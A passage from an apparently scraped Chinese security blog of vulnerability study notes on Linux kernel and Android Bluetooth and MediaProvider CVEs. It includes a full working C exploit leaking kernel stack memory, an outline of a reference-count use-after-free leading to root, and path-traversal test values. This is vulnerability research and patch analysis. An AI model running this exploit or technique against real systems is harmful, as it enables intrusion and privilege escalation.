socket(AF_IRDA, SOCK_DGRAM, 0); getsockname(sock, (struct sockaddr *) &amp;saddr, &amp;len); 现在的 saddr 结构将包含 29 字节的未初始化的内核栈内存（第 4 字节和第 9-36 字节）。 完整Exploit如下： /* * cve-2009-3002.c * * Linux Kernel &lt; 2.6.31-rc7 AF_IRDA getsockname 29-Byte Stack Disclosure * Jon Oberheide &lt;jon@oberheide.org&gt; * http://jon.oberheide.org * * Information: * * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3002 * * The Linux kernel before 2.6.31-rc7 does not initialize certain data * structures within getname functions, which allows local users to read * the contents of some kernel memory locations by calling getsockname * on ... (2) an AF_IRDA socket, related to the irda_getname function in * net/irda/af_irda.c. * * Notes: * * Yet another stack disclosure...although this one is big and contiguous. */ #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;time.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/syscall.h&gt; #ifndef AF_IRDA #define AF_IRDA 23 // AF_IRDA 被定义为 23，这是 IRDA（红外数据协会）套接字的地址族标识符 #endif struct sockaddr_irda { // 用于存储 IRDA 套接字地址信息 uint16_t sir_family; uint8_t sir_lsap_sel; uint32_t sir_addr; char sir_name[25]; }; const int randcalls[] = { __NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat, __NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl, __NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup, __NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl, __NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday, __NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid, __NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid, __NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority, __NR_sched_getparam, __NR_sched_get_priority_max }; void dump(const unsigned char *p, unsigned l) { printf(&quot;sockaddr_irda:&quot;); while (l &gt; 0) { printf(&quot; &quot;); if (l == 33 || l == 28) { printf(&quot;&lt;&lt;&lt; &quot;); } printf(&quot;%02x&quot;, *p); if (l == 33 || l == 1) { printf(&quot; &gt;&gt;&gt;&quot;); } ++p; --l; } printf(&quot;\\n&quot;); } int main(void) { struct sockaddr_irda saddr; int ret, call, sock, len = sizeof(saddr); printf(&quot;[+] Creating AF_IRDA socket.\\n&quot;); //【1】创建一个类型为 AF_IRDA 和 SOCK_DGRAM（数据报套接字）的套接字 sock = socket(AF_IRDA, SOCK_DGRAM, 0); if (sock == -1) { printf(&quot;[-] Error: Couldn't create AF_IRDA socket.\\n&quot;); printf(&quot;[-] %s.\\n&quot;, strerror(errno)); exit(1); } //【2】使用 memset 将 sockaddr_irda 结构清零，以确保它从干净的状态开始 memset(&amp;saddr, 0, len); printf(&quot;[+] Ready to call getsockname.\\n\\n&quot;); //【3】实现从 5 到 1 的倒计时，可能是为了准备演示？ for (ret = 5; ret &gt; 0; ret--) { printf(&quot;%d...\\n&quot;, ret); sleep(1); } srand(time(NULL)); // 启动循环 while (1) { // 【4】在循环中执行随机系统调用。这样做是为了操纵栈并使内存布局“伪有趣”或不可预测，模拟可能已经进行了各种系统调用影响堆栈状态的真实场景。 /* random stuff to make stack pseudo-interesting */ call = rand() % (sizeof(randcalls) / sizeof(int)); syscall(randcalls[call]); // 【5】重复调用 getsockname，尝试通过 sockaddr_irda 结构从内核中提取未初始化的内存 ret = getsockname(sock, (struct sockaddr *) &amp;saddr, &amp;len); if (ret != 0) { printf(&quot;[-] Error: getsockname failed.\\n&quot;); printf(&quot;[-] %s.\\n&quot;, strerror(errno)); exit(1); } //【6】使用 dump 函数将结果打印到标准输出 dump((unsigned char *) &amp;saddr, sizeof(saddr)); } return 0; } The Fix 修复很简单，在getname()函数开始时对sockaddr结构体使用memset()函数，以确保未初始化的内存不会泄露给用户空间 --- a/net/irda/af_irda.c +++ b/net/irda/af_irda.c @@ -714,6 +714,7 @@ static int irda_getname(struct socket *sock, struct sockaddr *uaddr, struct sock *sk = sock-&gt;sk; struct irda_sock *self = irda_sk(sk); + memset(&amp;saddr, 0, sizeof(saddr)); if (peer) { if (sk-&gt;sk_state != TCP_ESTABLISHED) return -ENOTCONN; References https://jon.oberheide.org/blog/2009/08/29/linux-kernel-getname-stack-memory-disclosures/ NVD/CVE: CVE-2009-3001 NVD/CVE: CVE-2009-3002 AF_IRDA exploit: cve-2009-3002.c AF_LLC exploit: cve-2009-3001.c Clement Lecigne's AF_APPLETALK exploit: http://milw0rm.com/exploits/9521 ","link":"https://lzxzl.github.io/post/cve-2009-3001-linux-kernel-getname-stack-memory-disclosures-by-jon-oberheide/"},{"title":"CVE-2023-22436 - Linux内核 - 引用计数","content":" 不多说了，都是理由，还是不够自律。2023.10.24 漏洞编号 相关漏洞 漏洞描述 漏洞影响 CVSS3.1基础得分 受影响的版本 受影响的仓库 修复链接 参考链接 OpenHarmony-SA-2023-0203 CVE-2023-22436 内核子系统中check_permission_for_set_tokenid函数中存在UAF漏洞。 本地攻击者利用该漏洞攻击可以权限提升，获得root权限。 7.8 OpenHarmony-v3.1-Release 到 OpenHarmony-v3.1.5-Release kernel_linux_5.10 3.1.x 研究员上报 patch +5 -6 drivers/accesstokenid/access_tokenid.c @@ -8,7 +8,6 @@ #define pr_fmt(fmt) &quot;access_token_id: &quot; fmt - #include &lt;linux/cred.h&gt; #include &lt;linux/errno.h&gt; #include &lt;linux/fs.h&gt; #include &lt;linux/miscdevice.h&gt; @@ -24,7 +23,7 @@ int access_tokenid_get_tokenid(struct file *file, void __user *uarg) static bool check_permission_for_set_tokenid(struct file *file) { - const struct cred *cred = get_task_cred(current); + kuid_t uid = current_uid(); struct inode *inode = file-&gt;f_inode; if (inode == NULL) { @@ -32,8 +31,8 @@ static bool check_permission_for_set_tokenid(struct file *file) return false; } - if (uid_eq(cred-&gt;uid, GLOBAL_ROOT_UID) || - uid_eq(cred-&gt;uid, inode-&gt;i_uid)) { + if (uid_eq(uid, GLOBAL_ROOT_UID) || + uid_eq(uid, inode-&gt;i_uid)) { return true; } @@ -58,7 +57,7 @@ static bool check_permission_for_ftokenid(struct file *file) { int i; struct group_info *group_info; - const struct cred *cred = get_task_cred(current); + kuid_t uid = current_uid(); struct inode *inode = file-&gt;f_inode; if (inode == NULL) { @@ -66,7 +65,7 @@ static bool check_permission_for_ftokenid(struct file *file) return false; } - if (uid_eq(cred-&gt;uid, GLOBAL_ROOT_UID)) + if (uid_eq(uid, GLOBAL_ROOT_UID)) return true; group_info = get_current_groups(); 分析 accesstokenid 驱动提供读写tokenid/ftokenid的能力，两者类似，这里仅分析前者。 [1]处通过get_task_cred()获取当前进程的cred对象，此时cred对象的reference count会加1。但是函数check_permission_for_set_tokenid在后续的过程中，使用完cred对象后并没有将reference count减1（即调用put_cred）。 那么，如果攻击者一直调用函数check_permission_for_set_tokenid()，那么cred对象的reference count会一直递增1，最后溢出为0，触发释放导致UAF。 static bool check_permission_for_set_tokenid(struct file *file) { const struct cred *cred = get_task_cred(current); // [1] struct inode *inode = file-&gt;f_inode; if (inode == NULL) { pr_err(&quot;%s: file inode is null\\n&quot;, __func__); return false; } if (uid_eq(cred-&gt;uid, GLOBAL_ROOT_UID) || uid_eq(cred-&gt;uid, inode-&gt;i_uid)) { return true; } return false; } 所有进程都有各自的cred对象（task结构体中），用来描述进程的uid等身份信息，且所有cred对象都存储于名为cred_jar的slab池中。如下所示，一开始attack process 的cred指针指向cred_jar中的第二个cred。 ------------- ------------- cred -------- cred(uid==x) ------------- | ------------- attack process -----------------&gt; cred(uid==xxx) ------------- cred(uid==y) ------------- cred(uid==z) ------------- cred_jar 接着触发漏洞，让cred对象的reference count溢出为0，触发释放，然而引用并没有销毁，指针仍然指向它。 reference count溢出为0时不会自动释放cred对象，可以通过open &amp; close一个文件来进行释放。open会+1，close会-1并释放。 ------------- ------------- cred -------- cred(uid==x) ------------- | ------------- attack process -----------------&gt; ------------- cred(uid==y) ------------- cred(uid==z) ------------- cred_jar 最后借助某一个privileged process 进行堆喷，覆盖刚才释放的cred对象，UAF，本地提权到root。 ------------- ------------- cred -------- cred(uid==x) ------------- | ------------- attack process -----------------&gt; cred(uid==0) | ------------- cred(uid==y) ------------- | ------------- cred -------- cred(uid==z) ------------- ------------- privileged process 参考文献 https://gitee.com/openharmony/security/blob/master/zh/security-disclosure/2023/2023-02.md https://gitee.com/openharmony/kernel_linux_5.10/commit/4048f12d993e0a89e9dda401224f12a99b701052 ","link":"https://lzxzl.github.io/post/cve-2023-22436-linux-nei-he-yin-yong-ji-shu/"},{"title":"CVE-2022-20447 - 蓝牙PAN - UAF","content":" 2023.09.19 CVE-2022-20447 A-233604485 ID High 13 patch 分析 在BNEP_WriteBuf -&gt; bnepu_check_send_packet中，是有场景可能导致p_buf被释放的，但是在从PAN_WriteBuf开始的调用链里，并没有对其做这种情况做检验。最后在[5]处的pcb-&gt;write.octets += p_buf-&gt;len可能导致UAF。 patch是把UAF的Use给消除掉，即在调用BNEP_WriteBuf之前，先把p_buf-&gt;len给拿出来赋值给局部变量len，那么后面给pcb-&gt;write.octets赋值的时候使用局部变量就不会产生UAF了。 诶，那么搜一下BNEP_WriteBuf，看看调用它的地方还有没有类似的问题，可惜的是就两处，并没有类似的问题。 PAN_WriteBuf // system/stack/pan/pan_api.cc /******************************************************************************* * * Function PAN_WriteBuf * * Description This sends data over the PAN connections. If this is called * on GN or NAP side and the packet is multicast or broadcast * it will be sent on all the links. Otherwise the correct link * is found based on the destination address and forwarded on * it. If the return value is not PAN_SUCCESS, the application * should take care of releasing the message buffer. * * Parameters: handle - handle for the connection * dst - MAC or BD Addr of the destination device * src - MAC or BD Addr of the source who sent this packet * protocol - protocol of the ethernet packet like IP or ARP * p_buf - pointer to the data buffer * ext - to indicate that extension headers present * * Returns PAN_SUCCESS - if the data is sent successfully * PAN_FAILURE - if the connection is not found or * there is an error in sending data * ******************************************************************************/ tPAN_RESULT PAN_WriteBuf(uint16_t handle, const RawAddress&amp; dst, const RawAddress&amp; src, uint16_t protocol, BT_HDR* p_buf, bool ext) { ...... // [1] 调用BNEP_WriteBuf，传入p_buf result = BNEP_WriteBuf(pcb-&gt;handle, dst, p_buf, protocol, &amp;src, ext); if (result == BNEP_IGNORE_CMD) { PAN_TRACE_DEBUG(&quot;PAN ignored data buf write to PANU&quot;); pcb-&gt;write.errors++; return PAN_IGNORE_CMD; } else if (result != BNEP_SUCCESS) { PAN_TRACE_ERROR(&quot;PAN failed to send data buf to the PANU&quot;); pcb-&gt;write.errors++; return (tPAN_RESULT)result; } pcb-&gt;write.octets += p_buf-&gt;len; // [5] 在BNEP_WriteBuf中，p_buf可能已经释放了，这里仍然使用，可能造成UAF pcb-&gt;write.packets++; PAN_TRACE_DEBUG(&quot;PAN successfully sent data buf to the PANU&quot;); return PAN_SUCCESS; } BNEP_WriteBuf // system/stack/bnep/bnep_api.cc tBNEP_RESULT BNEP_WriteBuf(uint16_t handle, const RawAddress&amp; p_dest_addr, BT_HDR* p_buf, uint16_t protocol, const RawAddress* p_src_addr, bool fw_ext_present) { ...... /* Send the data or queue it up */ bnepu_check_send_packet(p_bcb, p_buf); // [2] 调用bnepu_check_send_packet，传入p_buf return (BNEP_SUCCESS); // [4] 没有对bnepu_check_send_packet中释放p_buf的情况做检查，直接返回BNEP_SUCCESS } bnepu_check_send_packet // system/stack/bnep/bnep_utils.cc /******************************************************************************* * * Function bnepu_check_send_packet * * Description This function tries to send a packet to L2CAP. * If L2CAP is flow controlled, it enqueues the * packet to the transmit queue * * Returns void * ******************************************************************************/ void bnepu_check_send_packet(tBNEP_CONN* p_bcb, BT_HDR* p_buf) { LOG_DEBUG(&quot;BNEP - bnepu_check_send_packet for CID: 0x%x&quot;, p_bcb-&gt;l2cap_cid); if (p_bcb-&gt;con_flags &amp; BNEP_FLAGS_L2CAP_CONGESTED) { if (fixed_queue_length(p_bcb-&gt;xmit_q) &gt;= BNEP_MAX_XMITQ_DEPTH) { LOG_WARN(&quot;BNEP - congested, dropping buf, CID: 0x%x&quot;, p_bcb-&gt;l2cap_cid); osi_free(p_buf); // [3] 满足上述条件时，会释放p_buf } else { fixed_queue_enqueue(p_bcb-&gt;xmit_q, p_buf); } } else { L2CA_DataWrite(p_bcb-&gt;l2cap_cid, p_buf); } } ","link":"https://lzxzl.github.io/post/cve-2022-20447-lan-ya-pan-uaf/"},{"title":"CVE-2022-20410 - 蓝牙 - 整数溢出->OOB Read","content":" 2023.09.17 CVE-2022-20410 A-205570663 ID High 10, 11, 12, 12L, 13 patch diff --git a/system/stack/avrc/avrc_pars_ct.cc b/system/stack/avrc/avrc_pars_ct.cc index 12aee4c..a571042 100644 --- a/system/stack/avrc/avrc_pars_ct.cc +++ b/system/stack/avrc/avrc_pars_ct.cc @@ -237,7 +237,7 @@ } BE_STREAM_TO_UINT8(pdu, p); uint16_t pkt_len; - int min_len = 0; + uint16_t min_len = 0; /* read the entire packet len */ BE_STREAM_TO_UINT16(pkt_len, p); @@ -380,8 +380,14 @@ /* Parse the name now */ BE_STREAM_TO_UINT16(attr_entry-&gt;name.charset_id, p); BE_STREAM_TO_UINT16(attr_entry-&gt;name.str_len, p); + if (static_cast&lt;uint16_t&gt;(min_len + attr_entry-&gt;name.str_len) &lt; + min_len) { + // Check for overflow + android_errorWriteLog(0x534e4554, &quot;205570663&quot;); + } + if (pkt_len - min_len &lt; attr_entry-&gt;name.str_len) + goto browse_length_error; min_len += attr_entry-&gt;name.str_len; - if (pkt_len &lt; min_len) goto browse_length_error; attr_entry-&gt;name.p_str = (uint8_t*)osi_malloc( attr_entry-&gt;name.str_len * sizeof(uint8_t)); BE_STREAM_TO_ARRAY(p, attr_entry-&gt;name.p_str, @@ -444,8 +450,14 @@ BE_STREAM_TO_UINT32(attr_entry-&gt;attr_id, p); BE_STREAM_TO_UINT16(attr_entry-&gt;name.charset_id, p); BE_STREAM_TO_UINT16(attr_entry-&gt;name.str_len, p); + if (static_cast&lt;uint16_t&gt;(min_len + attr_entry-&gt;name.str_len) &lt; + min_len) { + // Check for overflow + android_errorWriteLog(0x534e4554, &quot;205570663&quot;); + } + if (pkt_len - min_len &lt; attr_entry-&gt;name.str_len) + goto browse_length_error; min_len += attr_entry-&gt;name.str_len; - if (pkt_len &lt; min_len) goto browse_length_error; attr_entry-&gt;name.p_str = (uint8_t*)osi_malloc(attr_entry-&gt;name.str_len * sizeof(uint8_t)); BE_STREAM_TO_ARRAY(p, attr_entry-&gt;name.p_str, attr_entry-&gt;name.str_len); @@ -815,8 +827,12 @@ BE_STREAM_TO_UINT32(p_attrs[i].attr_id, p); BE_STREAM_TO_UINT16(p_attrs[i].name.charset_id, p); BE_STREAM_TO_UINT16(p_attrs[i].name.str_len, p); - min_len += p_attrs[i].name.str_len; - if (len &lt; min_len) { + if (static_cast&lt;uint16_t&gt;(min_len + p_attrs[i].name.str_len) &lt; + min_len) { + // Check for overflow + android_errorWriteLog(0x534e4554, &quot;205570663&quot;); + } + if (len - min_len &lt; p_attrs[i].name.str_len) { for (int j = 0; j &lt; i; j++) { osi_free(p_attrs[j].name.p_str); } @@ -824,6 +840,7 @@ p_result-&gt;get_attrs.num_attrs = 0; goto length_error; } + min_len += p_attrs[i].name.str_len; if (p_attrs[i].name.str_len &gt; 0) { p_attrs[i].name.p_str = (uint8_t*)osi_calloc(p_attrs[i].name.str_len); 分析 下图为hanzinuo大神的PPT，看这一页很容易理解： min_len是一个uint16_t类型的变量，初始值为0，然后+8 从packet解析得到变量attr_entyr-&gt;name.str_len，该变量的取值范围是0～UINT16_MAX 将attr_entyr-&gt;name.str_len的值添加到min_len，因为这里没有做判断，所以如果attr_entyr-&gt;name.str_len很大，那么就可能导致整数溢出 下一行的if判断中，是想要判断packet是否&gt;=min_len，如果满足就继续往下走。而前面如果发生整数溢出，那么min_len变得很小，就会绕过这个检查 接着，malloc分配的chunk的大小是attr_entyr-&gt;name.str_len，会大于packet的实际长度，就会导致OOB Read 再来看看patch，好像和ppt里有点对不上？ 不过单看patch也能看明白：在三处BE_STREAM_TO_UINT16(p_attrs[i].name.str_len, p);后面都添加了长度检查，这个不难理解。 我唯一不理解的就是第一处patch把一个min_len从int改成了uint_16？这是为啥？改错了？我看了一下main分支的代码，所有min_len都改成了uint32_t。 ","link":"https://lzxzl.github.io/post/cve-2022-20410-lan-ya-zheng-shu-yi-chu-greateroob-read/"},{"title":"CVE-2022-20395 - MediaProvider - 路径穿越","content":" 昨天出去玩了，没带电脑，所以今天补上昨天的。2023.09.17补2023.09.16 CVE-2022-20395 A-221855295 EoP High 11, 12, 12L, 13 patch 分析 在MediaProvider的deleteIfAllowed函数里存在路径穿越漏洞，会导致任意文件删除。patch是改为使用getCanonicalFile和getCanonicalPath，对路径进行正规化之后再使用。 deleteIfAllowed // packages/providers/MediaProvider/src/com/android/providers/media/MediaProvider.java private void deleteIfAllowed(Uri uri, Bundle extras, String path) { try { final File file = new File(path); // 根据path获取File对象 checkAccess(uri, extras, file, true); // 检查是否可访问 deleteAndInvalidate(file); // 直接删除，可导致路径穿越 } catch (Exception e) { Log.e(TAG, &quot;Couldn't delete &quot; + path, e); } } computeDataFromValues // packages/providers/MediaProvider/src/com/android/providers/media/util/FileUtils.java /** * Compute {@link MediaColumns#DATA} from several scattered * {@link MediaColumns} values. This method performs no enforcement of * argument validity. */ public static void computeDataFromValues(@NonNull ContentValues values, @NonNull File volumePath, boolean isForFuse) { values.remove(MediaColumns.DATA); final String displayName = values.getAsString(MediaColumns.DISPLAY_NAME); final String resolvedDisplayName; // Pending file path shouldn't be rewritten for files inserted via filepath. if (!isForFuse &amp;&amp; getAsBoolean(values, MediaColumns.IS_PENDING, false)) { final long dateExpires = getAsLong(values, MediaColumns.DATE_EXPIRES, (System.currentTimeMillis() + DEFAULT_DURATION_PENDING) / 1000); final String combinedString = String.format( Locale.US, &quot;.%s-%d-%s&quot;, FileUtils.PREFIX_PENDING, dateExpires, displayName); // trim the file name to avoid ENAMETOOLONG error // after trim the file, if the user unpending the file, // the file name is not the original one resolvedDisplayName = trimFilename(combinedString, MAX_FILENAME_BYTES); } else if (getAsBoolean(values, MediaColumns.IS_TRASHED, false)) { final long dateExpires = getAsLong(values, MediaColumns.DATE_EXPIRES, (System.currentTimeMillis() + DEFAULT_DURATION_TRASHED) / 1000); final String combinedString = String.format( Locale.US, &quot;.%s-%d-%s&quot;, FileUtils.PREFIX_TRASHED, dateExpires, displayName); // trim the file name to avoid ENAMETOOLONG error // after trim the file, if the user untrashes the file, // the file name is not the original one resolvedDisplayName = trimFilename(combinedString, MAX_FILENAME_BYTES); } else { resolvedDisplayName = displayName; } // 这里没有判断values.getAsString(MediaColumns.RELATIVE_PATH)是否为空 final File filePath = buildPath(volumePath, values.getAsString(MediaColumns.RELATIVE_PATH), resolvedDisplayName); // 这里应该使用getCanonicalPath values.put(MediaColumns.DATA, filePath.getAbsolutePath()); } PoC 其实也就是test文件 MediaProviderTest.java + @Test + public void testInsertionWithInvalidFilePath_throwsIllegalArgumentException() { + final ContentValues values = new ContentValues(); + values.put(MediaStore.MediaColumns.RELATIVE_PATH, &quot;Android/media/com.example&quot;); + values.put(MediaStore.Images.Media.DISPLAY_NAME, + &quot;./../../../../../../../../../../../data/media/test.txt&quot;); + + IllegalArgumentException illegalArgumentException = Assert.assertThrows( + IllegalArgumentException.class, () -&gt; sIsolatedResolver.insert( + MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), + values)); + + assertThat(illegalArgumentException).hasMessageThat().contains( + &quot;Primary directory Android not allowed for content://media/external_primary/file;&quot; + + &quot; allowed directories are [Download, Documents]&quot;); + } + + @Test + public void testUpdationWithInvalidFilePath_throwsIllegalArgumentException() { + final ContentValues values = new ContentValues(); + values.put(MediaStore.MediaColumns.RELATIVE_PATH, &quot;Download&quot;); + values.put(MediaStore.Images.Media.DISPLAY_NAME, &quot;test.txt&quot;); + Uri uri = sIsolatedResolver.insert( + MediaStore.Files.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), + values); + + final ContentValues newValues = new ContentValues(); + newValues.put(MediaStore.MediaColumns.DATA, &quot;/storage/emulated/0/../../../data/media/&quot;); + IllegalArgumentException illegalArgumentException = Assert.assertThrows( + IllegalArgumentException.class, + () -&gt; sIsolatedResolver.update(uri, newValues, null)); + + assertThat(illegalArgumentException).hasMessageThat().contains( + &quot;Requested path /data/media doesn't appear under [/storage/emulated/0]&quot;); + } + FileUtilsTest.java @@ -63,6 +63,7 @@ import static org.junit.Assert.assertEquals; import static org.junit.Assert.assertFalse; import static org.junit.Assert.assertNull; +import static org.junit.Assert.assertThrows; import static org.junit.Assert.assertTrue; import static org.junit.Assert.fail; @@ -1200,4 +1201,27 @@ assertTrue(values.containsKey(MediaColumns.BUCKET_DISPLAY_NAME)); assertNull(values.get(MediaColumns.BUCKET_DISPLAY_NAME)); } + + @Test + public void testComputeDataFromValuesForValidPath_success() { + final ContentValues values = new ContentValues(); + values.put(MediaColumns.RELATIVE_PATH, &quot;Android/media/com.example&quot;); + values.put(MediaColumns.DISPLAY_NAME, &quot;./../../abc.txt&quot;); + + FileUtils.computeDataFromValues(values, new File(&quot;/storage/emulated/0&quot;), false); + + assertThat(values.getAsString(MediaColumns.DATA)).isEqualTo( + &quot;/storage/emulated/0/Android/abc.txt&quot;); + } + + @Test + public void testComputeDataFromValuesForInvalidPath_throwsIllegalArgumentException() { + final ContentValues values = new ContentValues(); + values.put(MediaColumns.RELATIVE_PATH, &quot;\\0&quot;); + values.put(MediaColumns.DISPLAY_NAME, &quot;./../../abc.txt&quot;); + + assertThrows(IllegalArgumentException.class, + () -&gt; FileUtils.computeDataFromValues(values, new File(&quot;/storage/emulated/0&quot;), + false)); + } } ","link":"https://lzxzl.github.io/post/cve-2022-20395-mediaprovider-lu-jing-chuan-yue/"},{"title":"CVE-2022-20445  - 蓝牙SDP - 整数溢出","content":" 2023.09.15 CVE-2022-20445 A-225876506 ID High 10, 11, 12, 12L, 13 patch 分析 没有校验packet中的cur_handles，导致后续的三次整数溢出。但是我没有明白哪里会溢出啊，[5]处的循环根本进不去啊。。。 // packages/modules/Bluetooth/system/stack/sdp/sdpint.h /* Define the SDP Connection Control Block */ struct tCONN_CB { ...... uint32_t handles[SDP_MAX_DISC_SERVER_RECS]; /* Discovered server record handles */ uint16_t num_handles; /* Number of server handles */ uint16_t cur_handle; /* Current handle being processed */ ...... }; /****************************************************************************** * * Function process_service_search_rsp * * Description This function is called when there is a search response from * the server. * * Returns void * ******************************************************************************/ static void process_service_search_rsp(tCONN_CB* p_ccb, uint8_t* p_reply, uint8_t* p_reply_end) { // p_reply指向本次解析的packet的开头；p_reply_end指向本次解析的packet的结尾 uint16_t xx; uint16_t total, cur_handles, orig; uint8_t cont_len; if (p_reply + 8 &gt; p_reply_end) { android_errorWriteLog(0x534e4554, &quot;74249842&quot;); sdp_disconnect(p_ccb, SDP_GENERIC_ERROR); return; } /* Skip transaction, and param len */ p_reply += 4; BE_STREAM_TO_UINT16(total, p_reply); // [1] cur_handles从packet中读取，可控，取值范围为0～UINT16_MAX。该变量代表本次解析需要处理的handles数量 BE_STREAM_TO_UINT16(cur_handles, p_reply); // [2] orig的类型是uint16_t。变量orig表示之前的解析过程中处理过的handles总数 orig = p_ccb-&gt;num_handles; // [3] 这行代码的目的是计算：加上本次解析，一共需要解析的handles数量 // 如果cur_handles足够大（比如前面读取的时候传入负数），那么这里将会发生整数回绕，p_ccb-&gt;num_handles &lt; orig p_ccb-&gt;num_handles += cur_handles; if (p_ccb-&gt;num_handles == 0) { SDP_TRACE_WARNING(&quot;SDP - Rcvd ServiceSearchRsp, no matches&quot;); sdp_disconnect(p_ccb, SDP_NO_RECS_MATCH); return; } /* Save the handles that match. We will can only process a certain number. */ if (total &gt; sdp_cb.max_recs_per_search) total = sdp_cb.max_recs_per_search; if (p_ccb-&gt;num_handles &gt; sdp_cb.max_recs_per_search) p_ccb-&gt;num_handles = sdp_cb.max_recs_per_search; // 这个if判断的含义是：计算一个偏移量，以判断需要解析的数据是否超过 p_reply_end，即判断是否会发生越界。 // 符号 &gt; 左边的表达式用于计算一个指针的偏移量。具体来说，它计算了从指针p_reply开始，向后移动的字节数。 // 逐步理解：(p_ccb-&gt;num_handles - orig) 的值其实就是cur_handles，代表本次解析需要处理的handles数量 // ((p_ccb-&gt;num_handles - orig) * 4)：乘以4是因为handle的长度是4个字节（可以查看p_ccb-&gt;handles[]数组，该数组的类型是uint32_t） // p_reply + ((p_ccb-&gt;num_handles - orig) * 4)：将p_reply往后移动((p_ccb-&gt;num_handles - orig) * 4)个字节，然后就能理解if判断的作用了 // [4] 再次发生两次整数溢出： // [4.1] p_ccb-&gt;num_handles - orig 的结果其实是cur_handles，一个很大的值 // [4.2] p_reply + ((p_ccb-&gt;num_handles - orig) * 4) + 1，发生整数回绕后，变得很小，从而绕过该if检查 if (p_reply + ((p_ccb-&gt;num_handles - orig) * 4) + 1 &gt; p_reply_end) { android_errorWriteLog(0x534e4554, &quot;74249842&quot;); sdp_disconnect(p_ccb, SDP_GENERIC_ERROR); return; } // [5] 如果按照前面的溢出情况，xx &gt; p_ccb-&gt;num_handles，不会进循环体里啊。。。。哪里溢出了。。。 for (xx = orig; xx &lt; p_ccb-&gt;num_handles; xx++) BE_STREAM_TO_UINT32(p_ccb-&gt;handles[xx], p_reply); BE_STREAM_TO_UINT8(cont_len, p_reply); if (cont_len != 0) { if (cont_len &gt; SDP_MAX_CONTINUATION_LEN) { sdp_disconnect(p_ccb, SDP_INVALID_CONT_STATE); return; } if (p_reply + cont_len &gt; p_reply_end) { android_errorWriteLog(0x534e4554, &quot;68161546&quot;); sdp_disconnect(p_ccb, SDP_INVALID_CONT_STATE); return; } /* stay in the same state */ sdp_snd_service_search_req(p_ccb, cont_len, p_reply); } else { /* change state */ p_ccb-&gt;disc_state = SDP_DISC_WAIT_ATTR; /* Kick off the first attribute request */ process_service_attr_rsp(p_ccb, NULL, NULL); } } 测试[4]中的两次整数溢出： // 假设p_ccb-&gt;num_handles - orig == xx #include&lt;stdio.h&gt; #include&lt;stdint.h&gt; void main(){ uint16_t xx = 16384; uint16_t a = (xx*4) + 1; printf(&quot;%hu\\n&quot;, a); } 编译执行后，结果如下： ❯ ./a.out 1 ","link":"https://lzxzl.github.io/post/cve-2022-20445-lan-ya-sdp-zheng-shu-yi-chu/"},{"title":"CVE-2022-20224 - 蓝牙HFP Client - 越界读","content":" 2023.09.14 CVE-2022-20224 A-220732646 ID High 10, 11, 12, 12L patch 分析 也很容易根据patch看出来，while循环中遍历buf的时候，只判断了是否遇到回车符\\r，而没有判断终止符\\0，可导致越界读。 /* skip rest of AT string up to &lt;cr&gt; */ #define AT_SKIP_REST(buf) \\ do { \\ while (*(buf) != '\\r') (buf)++; \\ // 没有判断\\0，可导致越界读 } while (0) ","link":"https://lzxzl.github.io/post/cve-2022-20224-lan-ya-hfp-client-yue-jie-du/"},{"title":"CVE-2022-20229 - 蓝牙HFP Client - 越界写","content":" 2023.09.14 CVE-2022-20229 A-224536184 RCE Critical 10, 11, 12, 12L patch 分析 下面的函数bta_hf_client_handle_cind_list_item中，没有对参数index做检查，而后在for循环中，直接作为数组的下标，可能导致越界写。 // bta/hf_client/bta_hf_client_at.cc /* handles a single indicator descriptor - registers it for value changing * events */ static void bta_hf_client_handle_cind_list_item(tBTA_HF_CLIENT_CB* client_cb, char* name, uint32_t min, uint32_t max, uint32_t index) { uint8_t i = 0; APPL_TRACE_DEBUG(&quot;%s: %lu.%s &lt;%lu:%lu&gt;&quot;, __func__, index, name, min, max); /* look for a matching indicator on list of supported ones */ for (i = 0; i &lt; BTA_HF_CLIENT_AT_SUPPORTED_INDICATOR_COUNT; i++) { if (strcmp(name, BTA_HF_CLIENT_INDICATOR_SERVICE) == 0) { service_index = index; } /* look for a match - search one sign further than indicators name to check * for string end */ /* It will distinguish 'callheld' which could be matched by strncmp as * 'call'. */ if (strncmp(name, bta_hf_client_indicators[i].name, bta_hf_client_indicators[i].namelen) != 0) continue; /* index - enumerates value position in the incoming sequence */ /* if name matches one of the known indicators, add its incoming position */ /* to lookup table for easy value-&gt;indicator matching later, when only * values come */ client_cb-&gt;at_cb.indicator_lookup[index] = i; // 越界写，没有对传入的index做检查 return; } } 这里我没有去跟bta_hf_client_handle_cind_list_item的调用链了，但是可以快速判断的是边上的函数（如下）对index做了判断，而这个函数没有做判断。哎，为什么我没看到这里呢，还是菜！ static void bta_hf_client_handle_cind_value(tBTA_HF_CLIENT_CB* client_cb, uint32_t index, uint32_t value) { APPL_TRACE_DEBUG(&quot;%s: index: %u value: %u&quot;, __func__, index, value); if (index &gt;= BTA_HF_CLIENT_AT_INDICATOR_COUNT) { return; } HFP Android蓝牙的HFP是指Android系统中的蓝牙功能支持的一个重要技术，它代表的是“Hands-Free Profile”（免提配置文件）。 HFP的作用就像是给你的手机添加了一个无线耳机功能，让你可以通过蓝牙连接手机和其他设备，比如耳机、车载设备等进行通话。它能让你在开车或者其他需要双手空闲的情况下，通过无线耳机和手机进行通话，避免了拿着手机通话的不便。 使用HFP，你可以通过蓝牙耳机接听和拨打电话，调整音量，甚至是拨打语音指令来控制手机。它还支持通话中的音频传输，保证你能听到清晰的声音。 此外，HFP还支持一些额外的功能，比如显示来电号码、通话记录的同步等。它通过蓝牙连接手机和其他设备，使得你可以更方便地进行通话，同时也提升了安全性，避免了因为拿着手机通话而分散注意力。 